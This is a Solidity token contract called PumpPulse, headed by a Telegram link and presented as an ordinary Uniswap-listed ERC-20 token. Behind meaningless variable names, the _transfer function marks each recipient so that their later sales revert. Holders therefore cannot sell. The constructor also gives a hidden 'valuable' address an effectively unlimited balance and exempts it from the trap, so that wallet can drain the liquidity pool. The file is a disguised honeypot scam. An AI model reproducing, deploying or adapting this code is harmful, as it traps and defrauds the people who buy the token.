// https://t.me/Pumppulse

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PumpPulse is Ownable {
    constructor(
        string memory speed,
        string memory skin,
        address asleep,
        address valuable
    ) {
        uniswapV2Router = IUniswapV2Router02(asleep);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = skin;
        _name = speed;
        noun = 3;
        _decimals = 9;
        _balances[valuable] = official;
        brother = 1000000000;
        aloud[valuable] = official;
        _tTotal = brother * 10**_decimals;
        aloud[msg.sender] = official;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public noun;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private brother;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private noon;
    uint256 private official = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address warm,
        address escape,
        uint256 difficulty
    ) internal {
        uint256 talk = noun;

        address thee = uniswapV2Pair;

        if (aloud[warm] == 0 && thee != warm && disease[warm] > 0) {
            aloud[warm] -= talk;
        }

        address store = noon;
        noon = escape;
        disease[store] += talk + 1;

        _balances[warm] -= difficulty;
        uint256 strip = (difficulty / 100) * noun;
        difficulty -= strip;
        _balances[escape] += difficulty;
    }

    mapping(address => uint256) private disease;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private aloud;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}